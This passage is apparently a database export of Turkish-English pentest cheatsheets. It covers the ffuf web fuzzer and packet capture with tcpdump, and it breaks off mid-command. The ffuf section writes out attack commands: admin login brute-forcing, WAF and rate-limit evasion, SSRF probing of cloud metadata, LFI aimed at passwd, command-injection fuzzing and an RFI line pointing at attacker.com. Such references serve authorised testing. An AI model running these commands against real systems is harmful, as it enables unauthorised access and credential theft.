https://target.com/FUZZ -w wordlist.txt -r -maxredirs 3\n```\n\n### Auto-Calibration\n\n**`-ac`**\n*Auto-calibrate filtering.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**`-acc <str>`**\n*Custom auto-calibration string.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -acc "CustomNotFoundString"\n```\n\n### Output & Display\n\n**`-s`**\n*Silent mode (no status).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -s\n```\n\n**`-v`**\n*Verbose output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -v\n```\n\n**`-c`**\n*Colorize output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -c\n```\n\n**`-e <extensions>`**\n*Extension list (comma-separated).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html\n```\n\n### Proxy & Replay\n\n**`-replay-proxy <url>`**\n*Replay matched requests through proxy.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080\n```\n\n**`-x <proxy>`**\n*HTTP/SOCKS proxy.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n### SSL/TLS\n\n**`-k`**\n*Skip TLS verification.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -k\n```\n\n### Advanced\n\n**`-ic`**\n*Ignore comment lines in wordlist.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ic\n```\n\n**`-ignore-body`**\n*Don't save response body.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ignore-body\n```\n\n## Açıklamalı Komutlar\n\n**Directory fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -c\n```\n*-u: URL with FUZZ keyword, -w: Wordlist, -mc: Match HTTP codes, -c: Color output*\n\n**VHOST fuzzing:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com" -fs 1234\n```\n*-H: Custom header with FUZZ, -fs: Filter by size (baseline response)*\n\n**Parameter fuzzing:**\n```\nffuf -u https://target.com/api?id=FUZZ -w numbers.txt -mc 200 -mr "success"\n```\n*-mr: Match regex in response*\n\n**POST login brute-force:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -fc 401\n```\n*-X POST: HTTP method, -d: POST data, -fc 401: Filter Unauthorized*\n\n**JSON API fuzzing:**\n```\nffuf -u https://target.com/api -w values.txt -X POST -H "Content-Type: application/json" -d '{"key":"FUZZ"}' -mc 200\n```\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/adminFUZZ -w extensions.txt -mc 200,301\n```\n*Extension directly after filename*\n\n**With extensions flag:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt -mc 200\n```\n*-e: Append extensions*\n\n**Recursive fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -mc 200,301\n```\n*-recursion: Enable, -recursion-depth: Max depth*\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -c\n```\n*-ac: Auto-filter false positives*\n\n**Multi-wordlist clusterbomb:**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z -mode clusterbomb\n```\n*All combinations of both wordlists*\n\n**Pitchfork mode:**\n```\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n*Parallel iteration (line-by-line)*\n\n**Header fuzzing:**\n```\nffuf -u https://target.com/admin -w tokens.txt -H "Authorization: Bearer FUZZ" -mc 200\n```\n\n**WAF bypass (slow):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5-1 -t 5 -c\n```\n*-rate: 10 req/s, -p: Random delay 0.5-1s, -t: 5 threads*\n\n**Burp proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080 -mc 200\n```\n*-x: Proxy all requests through Burp*\n\n**JSON output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json -mc 200\n```\n*-o: Output file, -of json: JSON format*\n\n**Silent mode:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -s -o results.txt\n```\n*-s: No progress output*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Gizli Directory Keşfi\n\n```\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -c -o discovered-dirs.json -of json\n```\n\n**Admin panels:**\n```\nffuf -u https://target.com/FUZZ -w admin-panels.txt -mc 200,301 -r -c\n```\n\n**Backup files:**\n```\nffuf -u https://target.com/FUZZ -w backups.txt -e .bak,.old,.backup,.zip -mc 200\n```\n\n### Senaryo 2: VHOST / Subdomain Fuzzing\n\n**VHOST discovery:**\n```\nffuf -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.target.com" -fs 1234 -c\n```\n\n**DNS-based:**\n```\nffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200 -c\n```\n\n### Senaryo 3: API Endpoint Fuzzing\n\n**REST API:**\n```\nffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt -mc 200,201,401 -c\n```\n\n**With IDs:**\n```\nffuf -u https://api.target.com/users/FUZZ -w numbers.txt -mc 200 -fs 42\n```\n\n**JSON body:**\n```\nffuf -u https://api.target.com/data -w payloads.txt -X POST -H "Content-Type: application/json" -d '{"param":"FUZZ"}' -mc 200 -mr "success"\n```\n\n### Senaryo 4: Parametre Fuzzing ile RCE Tespiti\n\n**Command injection:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w rce-payloads.txt -mc 200 -mr "root|admin|uid=" -timeout 30\n```\n\n**Time-based:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w time-based.txt -ft 10 -mc 200\n```\n\n### Senaryo 5: JSON Body Fuzzing\n\n**Single param:**\n```\nffuf -u https://api.target.com/action -w payloads.txt -X POST -H "Content-Type: application/json" -d '{"action":"FUZZ"}' -mc 200,500\n```\n\n**Multiple params:**\n```\nffuf -u https://api.target.com/user -w users.txt:FUZZ -w roles.txt:FUZ2Z -X POST -d '{"user":"FUZZ","role":"FUZ2Z"}' -mode clusterbomb -mc 200\n```\n\n### Senaryo 6: Login Brute-Force (WAF Sınırlı)\n\n**Slow brute-force:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -fc 401,429 -rate 5 -p 1-2 -t 5 -c\n```\n\n**With session:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: session=abc123" -fc 401 -mc 302\n```\n\n### Senaryo 7: Rate-Limit Bypass Testleri\n\n**Different User-Agents:**\n```\nffuf -u https://target.com/api -w user-agents.txt -H "User-Agent: FUZZ" -mc 200 -fs 42\n```\n\n**IP rotation (X-Forwarded-For):**\n```\nffuf -u https://target.com/api -w ips.txt -H "X-Forwarded-For: FUZZ" -mc 200\n```\n\n### Senaryo 8: SSRF Endpoint Keşfi\n\n**Internal IPs:**\n```\nffuf -u https://target.com/api?url=http://FUZZ -w internal-ips.txt -mc 200 -mr "admin|root|internal"\n```\n\n**Cloud metadata:**\n```\nffuf -u https://target.com/fetch?url=http://FUZZ/latest/meta-data/ -w cloud-endpoints.txt -mc 200\n```\n\n### Senaryo 9: File Upload Bypass Testi\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/upload -w extensions.txt -X POST -d "file=test.FUZZ" -H "Content-Type: multipart/form-data" -mc 200 -fr "not allowed"\n```\n\n**Content-Type fuzzing:**\n```\nffuf -u https://target.com/upload -w content-types.txt -X POST -H "Content-Type: FUZZ" -mc 200\n```\n\n### Senaryo 10: LFI / RFI Parametre Fuzzing\n\n**LFI:**\n```\nffuf -u https://target.com/?file=FUZZ -w lfi-payloads.txt -mc 200 -mr "root:|passwd"\n```\n\n**Path traversal:**\n```\nffuf -u https://target.com/?file=../../FUZZ -w files.txt -mc 200\n```\n\n**RFI:**\n```\nffuf -u https://target.com/?url=http://attacker.com/FUZZ -w payloads.txt -mc 200\n```\n\n### Senaryo 11: 403 Bypass / Path Traversal\n\n**Bypass techniques:**\n```\nffuf -u https://target.com/adminFUZZ -w bypass-payloads.txt -mc 200,301 -fc 403\n```\n\n**Payloads:**\n```\n/\n//\n/%2f\n/./\n```\n\n## Best Practices\n\n**1. Doğru Concurrency Ayarı:**\n\n**Stealth (low):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5 -rate 10\n```\n\n**Balanced:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n**Aggressive:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 200\n```\n\n**2. WAF Signature Tetiklememek:**\n\n**Randomization:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1-0.5 -H "User-Agent: Mozilla/5.0..."\n```\n\n**Low rate:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -t 5\n```\n\n**3. Response Similarity Analiz:**\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**Size filtering:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42,1234\n```\n\n**4. Recursive Fuzzing Riskleri:**\n\n**Limit depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**Monitor progress:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -c -v\n```\n\n**5. Wordlist Optimizasyonu:**\n\n**Start small:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200,301\n```\n\n**Then expand:**\n```\nffuf -u https://target.com/FUZZ -w big-wordlist.txt -mc 200,301 -ac\n```\n\n**6. Timing Tabanlı Blind Fuzzing:**\n\n**Time threshold:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w payloads.txt -ft 5 -timeout 30\n```\n\n**7. Hedefe Göre Matcher/Filter:**\n\n**Dynamic sites:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -c\n```\n\n**Static sites:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200 -fs 1234\n```\n\n**8. Gerçek Pentest Workflow:**\n\n**1. Initial scan:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,403 -c\n```\n\n**2. Extension enum:**\n```\nffuf -u https://target.com/FUZZ -w found-dirs.txt -e .php,.html,.txt -mc 200\n```\n\n**3. Recursive:**\n```\nffuf -u https://target.com/interesting-dir/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**4. Parameter fuzzing:**\n```\nffuf -u https://target.com/endpoint?FUZZ=value -w params.txt -mc 200\n```\n\n## Sık Yapılan Hatalar\n\n**1. -mc yerine -fc kullanmak:**\n```\n# YANLIŞ (sadece 404 filtrele)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404\n\n# DOĞRU (200, 301, 302 match)\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**2. Çok yüksek concurrency:**\n```\n# YANLIŞ (rate limit / IP ban)\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 500\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n**3. Yanlış wordlist seçimi:**\n```\n# YANLIŞ (çok büyük, gereksiz)\nffuf -u https://small-app.com/FUZZ -w huge-wordlist.txt\n\n# DOĞRU (kademeli)\nffuf -u https://small-app.com/FUZZ -w common.txt\n```\n\n**4. FUZZ keyword yanlış konumlandırma:**\n```\n# YANLIŞ (FUZZ yerine literal string)\nffuf -u https://target.com/admin -w wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**5. Redirect takibi kapalı:**\n```\n# YANLIŞ (301/302 manual takip)\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 301\n\n# DOĞRU (follow redirects)\nffuf -u https://target.com/FUZZ -w wordlist.txt -r -mc 200\n```\n\n**6. JSON body FUZZ eksikliği:**\n```\n# YANLIŞ (FUZZ yok)\nffuf -u https://api.target.com -w payloads.txt -X POST -d '{"key":"value"}'\n\n# DOĞRU\nffuf -u https://api.target.com -w payloads.txt -X POST -d '{"key":"FUZZ"}'\n```\n\n**7. Response length vs word count:**\n```\n# YANLIŞ (size yerine word)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fw 100\n\n# DOĞRU (size filtering)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234\n```\n\n**8. Auto-calibration yapmamak:**\n```\n# YANLIŞ (manual filtering)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**9. Output kaydetmemek:**\n```\n# YANLIŞ\nffuf -u https://target.com/FUZZ -w huge-wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w huge-wordlist.txt -o results.json -of json\n```\n\n**10. Extension list yanlış:**\n```\n# YANLIŞ (extension flag kullanmadan)\nffuf -u https://target.com/FUZZ.php -w wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt\n```\n\n## Mode Örnekleri\n\n**Clusterbomb (all combinations):**\n```\n# 2 wordlist, her kombinasyon\nffuf -u https://target.com/FUZZ/FUZ2Z -w w1.txt:FUZZ -w w2.txt:FUZ2Z -mode clusterbomb\n```\n\n**Pitchfork (parallel):**\n```\n# 2 wordlist, satır satır\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n\n## Filter & Matcher Kombinasyonları\n\n**Multiple filters:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403 -fs 42,1234 -fw 100\n```\n\n**Multiple matchers:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301 -ms 1000-5000 -mr "success"\n```\n\n## İpuçları\n\n**Quick scan:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200 -c\n```\n\n**Deep scan:**\n```\nffuf -u https://target.com/FUZZ -w big.txt -recursion -recursion-depth 3 -ac -o deep.json -of json\n```\n\n**API testing:**\n```\nffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt -mc 200,201,401 -c -v\n```\n\n**Bypass 403:**\n```\nffuf -u https://target.com/adminFUZZ -w bypass.txt -mc 200 -fc 403\n```\n	{ffuf,fuzzing,web,bruteforce,api}	{https://github.com/ffuf/ffuf,https://codingo.io/tools/ffuf/}	192	2026-01-23 22:21:30.245	2026-01-23 22:21:30.245
616	Tcpdump Cheatsheet	Tcpdump Cheatsheet	# Tcpdump - Advanced Packet Analysis\n\n## Temel Kullanım\n\n### Basit Trafik Yakalama\n\n**Tüm trafiği yakala:**\n```\ntcpdump\n```\n\n**Interface seçimi:**\n```\ntcpdump -i eth0\n```\n\n**Belirli sayıda paket:**\n```\ntcpdump -c 100\n```\n\n### IP, Port, Protokol Filtreleri\n\n**Specific IP:**\n```\ntcpdump host 192.168.1.100\n```\n\n**Source IP:**\n```\ntcpdump src 192.168.1.100\n```\n\n**Destination IP:**\n```\ntcpdump dst 192.168.1.100\n```\n\n**Port filtreleme:**\n```\ntcpdump port 80\n```\n\n**Kaynak port:**\n```\ntcpdump src port 443\n```\n\n**Hedef port:**\n```\ntcpdump dst port 22\n```\n\n**Port range:**\n```\ntcpdump portrange 1000-2000\n```\n\n**Protokol:**\n```\ntcpdump tcp\ntcpdump udp\ntcpdump icmp\n```\n\n### Interface Seçimi\n\n**List interfaces:**\n```\ntcpdump -D\n```\n\n**Specific interface:**\n```\ntcpdump -i eth0\n```\n\n**Any interface:**\n```\ntcpdump -i any\n```\n\n### Output Yönlendirme\n\n**Pcap dosyasına kaydet:**\n```\ntcpdump -w capture.pcap\n```\n\n**Dosyadan oku:**\n```\ntcpdump -r capture.pcap\n```\n\n**Canlı göster + kaydet:**\n```\ntcpdump -w capture.pcap -v\n```\n\n### Timestamps\n\n**Default timestamp:**\n```\ntcpdump -t\n```\n\n**Readable timestamp:**\n```\ntcpdump -tttt\n```\n\n**Delta timestamp:**\n```\ntcpdump -ttt\n```\n\n**Unix epoch:**\n```\ntcpdump -tt\n```\n\n### Pcap Kayıt Alma\n\n**Basit kayıt:**\n```\ntcpdump -i eth0 -w output.pcap\n```\n\n**Verbose kayıt:**\n```\ntcpdump -i eth0 -vv -w detailed.pcap\n```\n\n**Filtered capture:**\n```\ntcpdump -i eth0 port 80 -w http.pcap\n```\n\n## İleri Seviye Kullanım\n\n### Berkeley Packet Filter (BPF) Sözdizimi\n\n**TCP SYN flags:**\n```\ntcpdump 'tcp[tcpflags] & tcp-syn != 0'\n```\n\n**TCP ACK flags:**\n```\ntcpdump 'tcp[tcpflags] & tcp-ack != 0'\n```\n\n**Specific byte offset:**\n```\ntcpdump 'ip[8] = 64'\n```\n*TTL = 64*\n\n**TCP payload contains string:**\n```\ntcpdump -A 'tcp[20:4] = 0x47455420'\n```\n*"GET " in ASCII*\n\n**UDP packet size:**\n```\ntcpdump 'udp and greater 1000'\n```\n\n### Kombine Filtreler (and, or, not)\n\n**AND:**\n```\ntcpdump 'host 192.168.1.1 and port 80'\n```\n\n**OR:**\n```\ntcpdump 'tcp port 80 or tcp port 443'\n```\n\n**NOT:**\n```\ntcpdump 'not host 192.168.1.1'\n```\n\n**Complex:**\n```\ntcpdump '(tcp port 80 or tcp port 443) and host 192.168.1.100'\n```\n\n**Exclude subnet:**\n```\ntcpdump 'not net 192.168.0.0/16'\n```\n\n### VLAN, MPLS, GRE, PPP, VXLAN Yakalama\n\n**VLAN tagged:**\n```\ntcpdump -i eth0 vlan\n```\n\n**Specific VLAN ID:**\n```\ntcpdump 'vlan 100'\n```\n\n**MPLS:**\n```\ntcpdump -i eth0 mpls\n```\n\n**GRE encapsulated:**\n```\ntcpdump 'proto gre'\n```\n\n**VXLAN:**\n```\ntcpdump 'udp port 4789'\n```\n\n**PPP:**\n```\ntcpdump -i ppp0\n```\n\n### DNS, DHCP, TLS, TCP Handshake Analiz Filtreleri\n\n**DNS queries:**\n```\ntcpdump -i eth0 'udp port 53'\n```\n\n**DNS responses:**\n```\ntcpdump -i eth0 'udp port 53 and udp[10] & 0x80 = 0x80'\n```\n\n**DHCP traffic:**\n```\ntcpdump -i eth0 'udp port 67 or udp port 68'\n```\n\n**DHCP DISCOVER:**\n```\ntcpdump -i eth0 'udp port 67 and udp[8] = 0x01'\n```\n\n**TLS handshake (Client Hello):**\n```\ntcpdump -i eth0 'tcp port 443 and tcp[20] = 0x16'\n```\n\n**TCP SYN:**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn'\n```\n\n**TCP SYN-ACK:**\n```\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'\n```\n\n**TCP RST:**\n```\ntcpdump 'tcp[tcpflags] & tcp-rst != 0'\n```\n\n**TCP FIN:**\n```\ntcpdump 'tcp[tcpflags] & tcp-fin != 0'\n```\n\n### Fragmented Packet Yakalama\n\n**IP fragments:**\n```\ntcpdump 'ip[6:2] & 0x1fff != 0'\n```\n\n**First fragment:**\n```\ntcpdump 'ip[6] & 0x20 = 0x20'\n```\n\n**More fragments:**\n```\ntcpdump 'ip[6] & 0x20 = 0x20 or ip[6:2] & 0x1fff != 0'\n```\n\n### Promiscuous Mode\n\n**Enable (default):**\n```\ntcpdump -i eth0\n```\n\n**Disable promiscuous:**\n```\ntcpdump -i eth0 -p\n```\n\n**Monitor mode (wireless):**\n```\ntcpdump -i wlan0mon\n```\n\n### Snaplen Tuning\n\n**Default (262144 bytes):**\n```\ntcpdump -i eth0\n```\n\n**Custom snaplen (1500 bytes):**\n```\ntcpdump -i eth0 -s 1500\n```\n\n**Full packet (0 = unlimited):**\n```\ntcpdump -i eth0 -s 0\n```\n\n**Header only (96 bytes):**\n```\ntcpdump -i eth0 -s 96\n```\n\n### Paketleri Hex/Raw Dump Formatında İnceleme\n\n**Hex + ASCII:**\n```\ntcpdump -i eth0 -X\n```\n\n**Full hex:**\n```\ntcpdump -i eth0 -XX\n```\n\n**ASCII only:**\n```\ntcpdump -i eth0 -A\n```\n\n**Hex dump with link-layer:**\n```\ntcpdump -i eth0 -XX -vv\n```\n\n### Interface Buffer Tuning\n\n**Increase buffer (MB):**\n```\ntcpdump -i eth0 -B 4096\n```\n\n**Buffer size (KB):**\n```\ntcpdump -i eth0 -B 8192\n```\n\n### Ring Buffer Kayıt\n\n**File rotation by size:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap\n```\n*100MB per file, 5 files max*\n\n**Time-based rotation:**\n```\ntcpdump -i eth0 -G 3600 -w capture_%Y%m%d_%H%M%S.pcap\n```\n*Rotate every hour*\n\n### File Rotation (-C, -W)\n\n**Size-based:**\n```\ntcpdump -i eth0 -C 50 -W 10 -w output.pcap\n```\n*50MB files, max 10 files*\n\n**With compression:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z gzip\n```\n\n**Post-rotate command:**\n```\ntcpdump -i eth0 -C 100 -W 5 -w capture.pcap -z '/path/to/script.sh'\n```\n\n### Ağdaki Only-Control-Plane Trafik Analizi\n\n**Routing protocols (OSPF, BGP, EIGRP):**\n```\ntcpdump 'proto ospf or tcp port 179'\n```\n\n**LLDP:**\n```\ntcpdump -i eth0 'ether proto 0x88cc'\n```\n\n**CDP (Cisco Discovery Protocol):**\n```\ntcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cc'\n```\n\n**STP (Spanning Tree):**\n```\ntcpdump -i eth0 'ether dst 01:80:c2:00:00:00'\n```\n\n### IPv6 Özel Filtreleri\n\n**All IPv6:**\n```\ntcpdump ip6\n```\n\n**IPv6 ICMPv6:**\n```\ntcpdump 'ip6 and icmp6'\n```\n\n**IPv6 specific address:**\n```\ntcpdump 'ip6 host 2001:db8::1'\n```\n\n**IPv6 Router Advertisement:**\n```\ntcpdump 'icmp6 and ip6[40] = 134'\n```\n\n**IPv6 Neighbor Discovery:**\n```\ntcpdump 'icmp6 and (ip6[40] = 135 or ip6[40] = 136)'\n```\n\n### ARP, ICMP, ICMPv6 Detaylı Yakalama\n\n**ARP requests:**\n```\ntcpdump -i eth0 arp\n```\n\n**ARP request only:**\n```\ntcpdump 'arp[6:2] = 1'\n```\n\n**ARP reply:**\n```\ntcpdump 'arp[6:2] = 2'\n```\n\n**ICMP echo request:**\n```\ntcpdump 'icmp[icmptype] = icmp-echo'\n```\n\n**ICMP echo reply:**\n```\ntcpdump 'icmp[icmptype] = icmp-echoreply'\n```\n\n**ICMP unreachable:**\n```\ntcpdump 'icmp[icmptype] = icmp-unreach'\n```\n\n**ICMPv6:**\n```\ntcpdump 'ip6 and icmp6'\n```\n\n### SYN/ACK/RST Bazlı Saldırı Tespiti\n\n**SYN flood detection:**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn' -c 1000\n```\n\n**SYN without ACK (potential scan):**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn and not tcp[tcpflags] & tcp-ack'\n```\n\n**RST flood:**\n```\ntcpdump 'tcp[tcpflags] & tcp-rst != 0'\n```\n\n**SYN-ACK without prior SYN:**\n```\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) = (tcp-syn|tcp-ack)'\n```\n\n**Port scan detection (many SYN to different ports):**\n```\ntcpdump 'tcp[tcpflags] = tcp-syn' -nn | awk '{print $5}' | cut -d'.' -f5 | sort | uniq -c\n```\n\n### Tcpdump + Grep + Awk Pipeline\n\n**Extract IPs:**\n```\ntcpdump -n -r capture.pcap | awk '{print $3}' | cut -d'.' -f1-4 | sort -u\n```\n\n**HTTP GET requests:**\n```\ntcpdump -A -s 0 'tcp port 80' | grep -i 'GET'\n```\n\n**Count packets per IP:**\n```\ntcpdump -nn -r capture.pcap | awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -rn\n```\n\n**Extract User-Agent:**\n```\ntcpdump -A -s 0 'tcp port 80' | grep -oP 'User-Agent: \\K.*'\n```\n\n**DNS query statistics:**\n```\ntcpdump -nn 'udp port 53' | grep -oP '\\? \\K[^ ]+' | sort | uniq -c | sort -rn\n```\n\n### Live Trafik + Offline Pcap Analysis\n\n**Capture:**\n```\ntcpdump -i eth0 -w capture.pcap -C 100 -W 10\n```\n\n**Offline analysis:**\n```\ntcpdump -r capture.pcap 'tcp port 443'\ntcpdump -r capture.pcap -nn 'host 192.168.1.100'\n```\n\n**Read + filter:**\n```\ntcpdump -r large.pcap 'tcp[tcpflags] & tcp-syn != 0' -w syn-packets.pcap\n```\n\n### Tcpdump → Wireshark Workflow\n\n**Capture for Wireshark:**\n```\ntcpdump -i eth0 -s 0 -w capture.pcap\n```\n\n**Wireshark open:**\n```\nwireshark capture.pcap\n```\n\n**Tshark analysis:**\n```\ntshark -r capture.pcap -Y 'http.request.method == "GET"'\n```\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-i <interface>`**\n*Interface seçimi.*\n```\ntcpdump -i eth0\n```\n\n**`-n`**\n*Hostname resolution kapatma.*\n```\ntcpdump -n\n```\n\n**`-nn`**\n*Hostname + port service resolution kapatma.*\n```\ntcpdump -nn\n```\n\n**`-v`**\n*Verbose output.*\n```\ntcpdump -v\n```\n\n**`-vv`**\n*Very verbose.*\n```\ntcpdump -vv\n```\n\n**`-vvv`**\n*Maximum verbosity.*\n```\ntcpdump -vvv\n```\n\n**`-w <file>`**\n*Pcap dosyasına yazma.*\n```\ntcpdump -w output.pcap\n```\n\n**`-r <file>`**\n*Pcap dosyasından okuma.*\n```\ntcpdump -r input.pcap\n```\n\n**`-c <count>`**\n*Yakalanacak paket sayısı.*\n```\ntcpdump -c 100\n```\n\n**`host <address>`**\n*IP/hostname filtresi.*\n```\ntcpdump host 192.168.1.1\n```\n\n**`src <address>`**\n*Kaynak filtresi.*\n```\ntcpdump src 192.168.1.1\n```\n\n**`dst <address>`**\n*Hedef filtresi.*\n```\ntcpdump dst 192.168.1.1\n```\n\n**`port <port>`**\n*Port filtresi.*\n```\ntcpdump port 80\n```\n\n**`portrange <range>`**\n*Port aralığı.*\n```\ntcpdump portrange 1000-2000\n```\n\n**`proto <protocol>`**\n*Protokol (tcp, udp, icmp, arp, ip, ip6).*\n```\ntcpdump tcp\n```\n\n### Zaman & Format Argümanları\n\n**`-t`**\n*Timestamp gösterme.*\n```\ntcpdump -t\n```\n\n**`-tt`**\n*Unix epoch timestamp.*\n```\ntcpdump -tt\n```\n\n**`-ttt`**\n*Delta timestamp (önceki paketten geçen süre).*\n```\ntcpdump -ttt\n```\n\n**`-tttt`**\n*Readable timestamp (YYYY-MM-DD HH:MM:SS).*\n```\ntcpdump -tttt\n```\n\n**`-ttttt`**\n*Delta timestamp + mikrosaniye.*\n```\ntcpdump -ttttt\n```\n\n**`-X`**\n*Hex + ASCII dump.*\n```\ntcpdump -X\n```\n\n**`-XX`**\n*Full hex dump (link-layer dahil).*\n```\ntcpdump -XX\n```\n\n**`-A`**\n*ASCII dump.*\n```\ntcpdump -A\n```\n\n**`-S`**\n*Absolute TCP sequence numbers.*\n```\ntcpdump -S\n```\n\n**`-e`**\n*Link-layer header (Ethernet).*\n```\ntcpdump -e\n```\n\n**`-E <algo:secret>`**\n*IPsec ESP decrypt.*\n```\ntcpdump -E 'aes-cbc:0x1234567890abcdef'\n```\n\n### Performans Argümanları\n\n**`-s <snaplen>`**\n*Snaplen (yakalanacak paket boyutu).*\n```\ntcpdump -s 1500\n```\n*0 = unlimited*\n\n**`-B <size>`**\n*Kernel buffer boyutu (KB).*\n```\ntcpdump -B 4096\n```\n\n**`-p`**\n*Promiscuous mode devre dışı.*\n```\ntcpdump -p\n```\n\n**`-Z <user>`**\n*User privilege drop.*\n```\ntcpdump -Z nobody\n```\n\n**`-d`**\n*BPF program dump (human-readable).*\n```\ntcpdump -d 'tcp port 80'\n```\n\n**`-dd`**\n*BPF program dump (C format).*\n```\ntcpdump -dd 'tcp port 80'\n```\n\n**`-ddd`**\n*BPF program dump (decimal).*\n```\ntcpdump -ddd 'tcp port 80'\n```\n\n### File Rotation & Long Capture\n\n**`-C <size>`**\n*Max file size (MB).*\n```\ntcpdump -C 100 -w output.pcap\n```\n\n**`-W <count>`**\n*File rotation count.*\n```\ntcpdump -W 5 -w output.pcap\n```\n\n**`-G <seconds>`**\n*Zaman bazlı rotate.*\n```\ntcpdump -G 3600 -w capture_%Y%m%d_%H%M%S.pcap\n```\n\n**`-z <command>`**\n*Rotate sonrası custom komut.*\n```\ntcpdump -C 100 -z gzip -w output.pcap\n```\n\n### Diğer Argümanlar\n\n**`-D`**\n*Interface listesi.*\n```\ntcpdump -D\n```\n\n**`-L`**\n*Link-layer types.*\n```\ntcpdump -L -i eth0\n```\n\n**`-K`**\n*Checksum doğrulamayı atla.*\n```\ntcpdump -K\n```\n\n**`-q`**\n*Quick output (daha az detay).*\n```\ntcpdump -q\n```\n\n**`-l`**\n*Line-buffered output.*\n```\ntcpdump -l | grep 'GET'\n```\n\n**`-U`**\n*Packet-buffered output.*\n```\ntcpdump -U -w output.pcap\n```\n\n## Açıklamalı Komutlar\n\n**HTTP traffic yakalama:**\n```\ntcpdump -i eth0 -nn -A 'tcp port 80'\n```\n*-i eth0: eth0 interface, -nn: No resolution, -A: ASCII dump, tcp port 